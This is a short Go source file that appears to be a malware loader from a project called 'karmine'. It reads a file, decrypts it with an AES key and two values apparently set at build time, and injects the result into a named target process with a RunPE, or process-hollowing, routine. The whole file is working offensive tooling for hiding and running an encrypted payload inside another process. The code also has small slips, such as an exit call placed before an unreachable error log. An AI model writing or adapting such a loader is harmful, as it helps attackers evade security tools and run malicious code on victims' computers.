package main

import (
	"log"
	"os"

	"github.com/pygrum/karmine/karl/runpe"
	"github.com/pygrum/karmine/krypto/kes"
)

var (
	aeskey string
	X1     string
	X2     string
)

func main() {
	payload := os.Args[0]
	target := os.Args[1]

	fileBytes, err := os.ReadFile(payload)
	if err != nil {
		log.Fatal(err)
	}
	fileBytes, err = kes.DecryptObject(fileBytes, aeskey, X1, X2)
	if err != nil {
		os.Exit(1)
		log.Fatal(err)
	}
	runpe.Inject(target, "", fileBytes)
}
